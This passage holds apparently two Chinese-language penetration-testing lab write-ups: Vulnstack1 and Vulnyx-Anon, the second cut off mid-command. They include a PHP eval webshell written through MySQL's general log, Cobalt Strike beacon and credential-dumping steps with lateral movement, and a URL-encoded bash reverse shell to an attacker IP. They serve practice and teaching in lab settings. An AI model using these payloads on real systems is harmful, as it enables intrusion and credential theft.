class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌── root@kali -&gt; [~/tools] <br>└─# dirsearch -u http://192.168.33.129<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /root/tools/reports/http_192.168.33.129/_25-04-24_21-17-35.txt<br><br>Target: http://192.168.33.129/<br><br>[21:17:36] Starting: <br>[21:17:38] 403 -  215B  - /%C0%AE%C0%AE%C0%AF<br>[21:17:38] 403 -  211B  - /%3f/<br>[21:17:38] 403 -  210B  - /%ff<br>[21:17:40] 403 -  220B  - /.ht_wsr.txt<br>[21:17:40] 403 -  223B  - /.htaccess.orig<br>[21:17:40] 403 -  223B  - /.htaccess.save<br>[21:17:40] 403 -  224B  - /.htaccess_extra<br>[21:17:40] 403 -  221B  - /.htaccessBAK<br>[21:17:40] 403 -  223B  - /.htaccess.bak1<br>[21:17:40] 403 -  225B  - /.htaccess.sample<br>[21:17:40] 403 -  222B  - /.htaccessOLD2<br>[21:17:40] 403 -  213B  - /.htm<br>[21:17:40] 403 -  223B  - /.htaccess_orig<br>[21:17:40] 403 -  221B  - /.htaccessOLD<br>[21:17:40] 403 -  223B  - /.htpasswd_test<br>[21:17:40] 403 -  214B  - /.html<br>[21:17:40] 403 -  221B  - /.htaccess_sc<br>[21:17:40] 403 -  219B  - /.htpasswds<br>[21:17:40] 403 -  220B  - /.httr-oauth<br>[21:18:08] 403 -  225B  - /index.php::$DATA<br>[21:18:18] 200 -   71KB - /phpinfo.php<br>[21:18:18] 301 -  241B  - /phpmyadmin  -&gt;  http://192.168.33.129/phpmyadmin/<br>[21:18:18] 301 -  241B  - /phpMyAdmin  -&gt;  http://192.168.33.129/phpMyAdmin/<br>[21:18:19] 200 -    4KB - /phpmyAdmin/<br>[21:18:19] 200 -   32KB - /phpmyadmin/ChangeLog<br>[21:18:19] 200 -    4KB - /phpMyAdmin/<br>[21:18:19] 200 -    4KB - /phpMyadmin/<br>[21:18:19] 200 -    4KB - /phpmyadmin/<br>[21:18:19] 200 -    4KB - /phpmyadmin/index.php<br>[21:18:19] 200 -    4KB - /phpMyAdmin/index.php<br>[21:18:19] 200 -    2KB - /phpmyadmin/README<br>[21:18:31] 403 -  225B  - /Trace.axd::$DATA<br>[21:18:34] 403 -  226B  - /web.config::$DATA<br></code></pre></td></tr></table></figure><h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><p><img src="/img/vulnstack1/image-20250425091930914.png"></p><p>访问web，能够得到绝对路径<code>C:/phpStudy/WWW</code></p><p>phpmyadmin，需要登录 </p><p><img src="/img/vulnstack1/image-20250425092015350.png"></p><p>弱口令直接进去<code>root:root</code> 。或者爆破。</p><p>进去后查看一下sql变量设置 </p><p><img src="/img/vulnstack1/image-20250425092429735.png"></p><p>查找能否getshell的点。</p><p>查找<code>secure_file_priv</code>参数，是否允许写入文件。</p><p><img src="/img/vulnstack1/image-20250425092542084.png"></p><p>看来是null。那么试着写入日志，查看日志文件路径。</p><blockquote><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p></blockquote><p><img src="/img/vulnstack1/image-20250425092625730.png"></p><p><img src="/img/vulnstack1/image-20250425092648487.png"></p><p>日志路径：<code>C:\phpStudy\MySQL\data\stu1.log</code></p><p>但日志保存状态是<code>OFF</code></p><p>需要打开它。执行sql语句即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> &quot;ON&quot;;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file<span class="hljs-operator">=</span>&quot;C://phpStudy/www/shell.php&quot;;<br><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot;;<br></code></pre></td></tr></table></figure><p>改变日志保存状态以及保存路径为 web目录。并且执行查询语句将一句话木马保存到目标日志文件。</p><p><img src="/img/vulnstack1/image-20250425093010509.png"></p><p>成功后访问蚁剑连接。</p><p><img src="/img/vulnstack1/image-20250425093150200.png"></p><p>成功上马。</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h2><h3 id="cs前置"><a href="#cs前置" class="headerlink" title="cs前置"></a>cs前置</h3><p>首先启动一下server端。</p><p><img src="/img/vulnstack1/image-20250425093346300.png"></p><p>接着打开客户端连接</p><p>按照设置的 IP 与密码连接即可 </p><h3 id="创建Listener"><a href="#创建Listener" class="headerlink" title="创建Listener"></a>创建Listener</h3><p>左上角<code>Cobalt Strike</code> -&gt; <code>Listen</code> -&gt; <code>Add</code> </p><p><img src="/img/vulnstack1/image-20250425093906834.png"></p><h3 id="生成后门文件"><a href="#生成后门文件" class="headerlink" title="生成后门文件"></a>生成后门文件</h3><p><img src="/img/vulnstack1/image-20250425093954976.png"></p><p>选择监听器后生成</p><p><img src="/img/vulnstack1/image-20250425094010582.png"></p><h3 id="上传蚁剑执行"><a href="#上传蚁剑执行" class="headerlink" title="上传蚁剑执行"></a>上传蚁剑执行</h3><p><img src="/img/vulnstack1/image-20250425094109037.png"></p><p>这里还有另外一个系统，但是我通过打下来后发现，其实并没有什么区别。最后再放这里的getshell吧。</p><p>然后执行后门文件。</p><p><img src="/img/vulnstack1/image-20250425094159239.png"></p><p><img src="/img/vulnstack1/image-20250425094204425.png"></p><p>成功上线，打开<code>beacon</code></p><h2 id="获取域内信息"><a href="#获取域内信息" class="headerlink" title="获取域内信息"></a>获取域内信息</h2><h3 id="查找域控"><a href="#查找域控" class="headerlink" title="查找域控"></a>查找域控</h3><p><code>ipconfig /all</code></p><p><img src="/img/vulnstack1/image-20250425094400916.png"></p><p><code>god.org</code>且当前域为<code>stu1.god.org</code></p><h3 id="查找域内用户"><a href="#查找域内用户" class="headerlink" title="查找域内用户"></a>查找域内用户</h3><p><code>net user /domain</code></p><p><img src="/img/vulnstack1/image-20250425094610248.png"></p><p>域内用户：<code>administrator , ligang , liukaifeng01</code></p><h3 id="域内主机"><a href="#域内主机" class="headerlink" title="域内主机"></a>域内主机</h3><p><code>net group &quot;domain computers&quot; /domain</code></p><p><img src="/img/vulnstack1/image-20250425094719015.png"></p><p>域内有俩台主机（第一个不在）<code>ROOT-TVI862UBEH[192.168.52.141] ， STU1[192.168.52.143]</code></p><h3 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h3><p><code>net group &quot;domain controllers&quot; /domain</code></p><p><img src="/img/vulnstack1/image-20250425094952939.png"></p><p>域控为：<code>owa</code></p><h3 id="总"><a href="#总" class="headerlink" title="总"></a>总</h3><ul><li>域控：<code>owa</code></li><li>域内用户：<code>administrator , ligang , liukaifeng01</code></li><li>域内主机：<code>ROOT-TVI862UBEH[192.168.52.141] ， STU1[192.168.52.143]</code></li><li>域：<code>god.org</code></li></ul><h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><h3 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h3><blockquote><p>获取凭证即获取NTLM哈希，它是一个身份验证协议，在Windows中，NTLM存储在SAM数据库或NTDS.dit文件。如果获取到NTLM哈希可以尝试PTH攻击，哈希破解，中间人攻击等操作。</p></blockquote><p><img src="/img/vulnstack1/image-20250425100226885.png"></p><p>获取到NTLM。下一步进行内网探测。</p><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>使用<code>socks</code>模块搭建隧道 </p><p><img src="/img/vulnstack1/image-20250425100359678.png"></p><p>到kali中使用<code>proxychains</code></p><p>搭建好后，我选择使用fscan进行扫描。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌── root@kali -&gt; [~/tools] <br>└─# proxychains4 ./fscan -h 192.168.52.0/24 <br>[proxychains] config file found: /root/.proxychains/proxychains.conf<br>[proxychains] preloading /usr/local/lib/libproxychains4.so<br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: 2.0.0<br>[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880<br>[*] 开始信息扫描...<br>[*] CIDR范围: 192.168.52.0-192.168.52.255<br>[*] 已生成IP范围: 192.168.52.0 - 192.168.52.255<br>[*] 已解析CIDR 192.168.52.0/24 -&gt; IP范围 192.168.52.0-192.168.52.255<br>[*] 最终有效主机数量: 256<br>[+] 目标 192.168.52.1    存活 (ICMP)<br>[+] 目标 192.168.52.138  存活 (ICMP)<br>[+] 目标 192.168.52.143  存活 (ICMP)<br>[+] 目标 192.168.52.141  存活 (ICMP)<br>[+] ICMP存活主机数量: 4<br>[*] 共解析 218 个有效端口<br>[+] 端口开放 192.168.52.141:8099<br>[+] 端口开放 192.168.52.141:8098<br>[+] 端口开放 192.168.52.143:80<br>[+] 端口开放 192.168.52.138:80<br>[+] 端口开放 192.168.52.141:21<br>[+] 端口开放 192.168.52.1:139<br>[+] 端口开放 192.168.52.1:3306<br>[+] 端口开放 192.168.52.1:445<br>[+] 端口开放 192.168.52.1:135<br>[+] 端口开放 192.168.52.141:445<br>[+] 端口开放 192.168.52.143:445<br>[+] 端口开放 192.168.52.138:445<br>[+] 端口开放 192.168.52.138:139<br>[+] 端口开放 192.168.52.143:3306<br>[+] 端口开放 192.168.52.141:135<br>[+] 端口开放 192.168.52.141:139<br>[+] 端口开放 192.168.52.143:135<br>[+] 端口开放 192.168.52.138:135<br>[+] 端口开放 192.168.52.143:139<br>[+] 端口开放 192.168.52.138:88<br>[+] 端口开放 192.168.52.141:7002<br>[+] 端口开放 192.168.52.141:7001<br>[+] 端口开放 192.168.52.1:7890<br>[+] 存活端口数量: 23<br>[*] 开始漏洞扫描...<br>[!] 扫描错误 192.168.52.1:3306 - Error 1130: Host &#x27;cxcx&#x27; is not allowed to connect to this MySQL server<br>[!] 扫描错误 192.168.52.1:445 - read tcp 192.168.6.135:39408-&gt;192.168.52.1:445: read: connection reset by peer<br>[*] NetInfo<br>[*] 192.168.52.1<br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] cxcx</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 172.22.224.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.111.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.6.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.56.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 10.34.11.4</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 198.18.0.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.52.1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.33.1</span><br>[*] 网站标题 http://192.168.52.1:7890  状态码:400 长度:0      标题:无标题<br>[!] 扫描错误 192.168.52.1:7890 - Get &quot;https://192.168.52.1:7890&quot;: EOF<br>[!] 扫描错误 192.168.52.143:139 - netbios error<br>[*] NetInfo<br>[*] 192.168.52.138<br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] owa</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.52.138</span><br>[!] 扫描错误 192.168.52.141:139 - netbios error<br>[*] NetInfo<br>[*] 192.168.52.141<br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] root-tvi862ubeh</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.52.141</span><br>[!] 扫描错误 192.168.52.138:88 - Get &quot;http://192.168.52.138:88&quot;: read tcp 192.168.6.135:50074-&gt;192.168.52.138:88: read: connection reset by peer<br>[*] NetInfo<br>[*] 192.168.52.143<br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] stu1</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.33.129</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 192.168.52.143</span><br><span class="hljs-meta prompt_">   [-&gt;</span><span class="language-bash">] 169.254.129.186</span><br>[+] MS17-010 192.168.52.143     (Windows 7 Professional 7601 Service Pack 1)<br>[+] MS17-010 192.168.52.138     (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)<br>[*] NetBios 192.168.52.138  [+] DC:owa.god.org                   Windows Server 2008 R2 Datacenter 7601 Service Pack 1<br>[*] 网站标题 http://192.168.52.141:7002 状态码:200 长度:2632   标题:Sentinel Keys License Monitor<br>[+] MS17-010 192.168.52.141     (Windows Server 2003 3790)<br>[*] 网站标题 http://192.168.52.138     状态码:200 长度:689    标题:IIS7<br>[+] ftp 192.168.52.141:21:anonymous <br>[*] 网站标题 http://192.168.52.143     状态码:200 长度:14749  标题:phpStudy 探针 2014<br>[*] 网站标题 https://192.168.52.141:8098 状态码:401 长度:1656   标题:You are not authorized to view this page<br>[*] 网站标题 http://192.168.52.141:8099 状态码:403 长度:1409   标题:The page must be viewed over a secure channel<br>[!] 扫描错误 192.168.52.1:139 - netbios error<br>[!] 扫描错误 192.168.52.141:7001 - Get &quot;http://192.168.52.141:7001&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)<br>[!] 扫描错误 192.168.52.143:3306 - Error 1130: Host &#x27;192.168.52.1&#x27; is not allowed to connect to this MySQL server<br>[+] 扫描已完成: 23/23<br>[*] 扫描结束,耗时: 53.495039221s <br></code></pre></td></tr></table></figure><p>其中 域控<code>owa: 192.168.52.138</code> ,域内成员 <code>root-tvi862ubeh:192.168.52.141</code></p><p>并且都存在永恒之蓝漏洞。</p><h3 id="CS上线域控"><a href="#CS上线域控" class="headerlink" title="CS上线域控"></a>CS上线域控</h3><p>创建一个 <code>SMB</code>的监听器 </p><p><img src="/img/vulnstack1/image-20250425121356546.png"></p><p>通过<code>logonpasswords</code>获取到明文密码。</p><p><img src="/img/vulnstack1/image-20250425121443034.png"></p><p><img src="/img/vulnstack1/image-20250425121501215.png"></p><p>进行横向移动<code>psexec</code></p><p><img src="/img/vulnstack1/image-20250425121546928.png"></p><p>选择明文密码以及监听器，session选择一个正常的域内已控主机</p><p>接着就成功进行上线，域成员也是如此。</p><p><img src="/img/vulnstack1/image-20250425121634086.png"></p><p>我这里多次执行了所以多了一些重复的。</p><blockquote><p>第一次打内网，有些基础不牢，未来我会慢慢补充的。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnyx-Anon</title>
    <link href="/2025/04/24/vulnyx-Anon/"/>
    <url>/2025/04/24/vulnyx-Anon/</url>
    
    <content type="html"><![CDATA[<h2 id="Vulnyx-Anon-Writeup"><a href="#Vulnyx-Anon-Writeup" class="headerlink" title="Vulnyx-Anon Writeup"></a>Vulnyx-Anon Writeup</h2><p> 这是一个中等难度的靶机。</p><p>它是一个Linux系统的机器。</p><h3 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# nmap -Pn -n -p- 192.168.56.104<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-24 02:06 EDT<br>Nmap scan report for 192.168.56.104<br>Host is up (0.00098s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8F:E3:09 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds<br></code></pre></td></tr></table></figure><p>得到<code>22,80</code>端口的信息。</p><p>优先针对web服务进行信息收集。</p><h3 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h3><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/tmp]<br>└─# feroxbuster -u http://192.168.56.104/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak<br>                                                                                                                                                                                             <br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben &quot;epi&quot; Risher 🤓                 ver: 2.11.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://192.168.56.104/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.11.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ true<br> 💲  Extensions            │ [php, txt, html, bak]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>200      GET      368l      933w    10701c http://192.168.56.104/index.html<br>200      GET       25l      127w    10359c http://192.168.56.104/icons/openlogo-75.png<br>200      GET      368l      933w    10701c http://192.168.56.104/<br>301      GET        9l       28w      332c http://192.168.56.104/Anonymous-Connections =&gt; http://192.168.56.104/Anonymous-Connections/<br>200      GET      357l      810w    55475c http://192.168.56.104/Anonymous-Connections/anonymous.jpg<br>200      GET       98l      195w     2426c http://192.168.56.104/Anonymous-Connections/index.php<br>301      GET        9l       28w      340c http://192.168.56.104/Anonymous-Connections/victims =&gt; http://192.168.56.104/Anonymous-Connections/victims/<br><span class="hljs-meta prompt_">[#</span><span class="language-bash"><span class="hljs-comment">#########&gt;---------] - 11m  1672548/3308235 9m      found:7       errors:0</span></span>      <br><span class="hljs-meta prompt_">[#</span><span class="language-bash"><span class="hljs-comment">##################&gt;] - 11m  1095480/1102725 1625/s  http://192.168.56.104/</span></span> <br><span class="hljs-meta prompt_">[#</span><span class="language-bash"><span class="hljs-comment">#####&gt;-------------] - 6m    350115/1102725 1029/s  http://192.168.56.104/Anonymous-Connections/</span></span> <br><span class="hljs-meta prompt_">[#</span><span class="language-bash"><span class="hljs-comment">###&gt;---------------] - 4m    226540/1102725 892/s   http://192.168.56.104/Anonymous-Connections/victims/</span></span>  <br></code></pre></td></tr></table></figure><p>存在 <code>http://192.168.56.104/Anonymous-Connections/ </code></p><p><img src="/img/vulnyx-Anon/image-20250424141543015.png"></p><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p>需要我们输入一个IP？尝试一下本地回环地址。</p><p><img src="/img/vulnyx-Anon/image-20250424141706712.png"></p><p>回显为<code>nmap</code>，看这个输出是使用了对服务的版本信息进行探测。它会把扫描结果保存到<code>ip.log</code>日志文件中，通过目录扫描有另外一个目录<code>victims</code> 尝试到这个目录下访问这个log文件。</p><p><img src="/img/vulnyx-Anon/image-20250424142024852.png"></p><p>能够得到扫描结果。那么可以尝试在日志中写入php代码，然后通过访问日志文件执行php代码。那么寻找能够写入日志的方法。</p><p>当我们开启web服务后进行扫描会得到这样的请求记录。</p><p><img src="/img/vulnyx-Anon/image-20250424144319803.png"></p><p><code>robots.txt</code>这是由于<code>-sC</code>详细扫描需要扫描网站的防爬虫规则</p><p>那么创建一个<code>robots.txt</code>，看看如何控制输出结果。</p><p><img src="/img/vulnyx-Anon/image-20250424144539806.png"></p><p>根据规则写入一些字符。</p><p>修改后开启web服务，去到页面中扫描我们的kali。</p><blockquote><p>注意 </p><p><img src="/img/vulnyx-Anon/image-20250424143510647.png"></p><p>假设这里你默认的是8000，端口是扫不到的，因为靶机的nmap只会扫描500端口。</p><p><img src="/img/vulnyx-Anon/image-20250424143556690.png"></p></blockquote><p>所以这里我们设置端口在500以内。</p><p><img src="/img/vulnyx-Anon/image-20250424144633473.png"></p><p>会把<code>robots.txt</code>中的<code>Disallow</code> 的值输出。那么控制这个值进行rce  </p><p><img src="/img/vulnyx-Anon/image-20250424144740089.png"></p><p><img src="/img/vulnyx-Anon/image-20250424144752724.png"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p><code>bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.56.101/1234%200%3E%261%27</code></p><p><img src="/img/vulnyx-Anon/image-20250424144846065.png"></p><p>很明显我们在docker里。</p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>目前我们还是普通用户，但是我们所在<code>sudo</code>组 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ id<br>id<br>uid=1000(hacktivist) gid=1000(hacktivist) groups=1000(hacktivist),27(sudo)<br>hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo -l<br>sudo -l<br>Matching Defaults entries for hacktivist on debian1:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    use_pty<br><br>User hacktivist may run the following commands on debian1:<br>    (ALL : ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p>提权到root</p><h4 id="history"><a href="#history" class="headerlink" title="history"></a>history</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian1:/var/www/html/Anonymous-Connections/victims# history<br>history<br>    1  echo &#x27;root:$uP3r_$3cUr3_D0ck3r&#x27; | chpasswd<br>    2  cd<br>    3  nano .bash_history <br>    4  exit<br>    5  id<br>    6  ip a<br>    7  nmap -Pn -n -p- 172.17.0.2/24<br>    8  nmap -Pn -n -p- 10.10.10.10/24<br>    9  history<br></code></pre></td></tr></table></figure><p>得到一个root的密码，但不是当前docker的，保存。<code>$uP3r_$3cUr3_D0ck3r</code></p><h4 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@debian1:/var/www/html/Anonymous-Connections/victims# nmap -Pn -n -p- 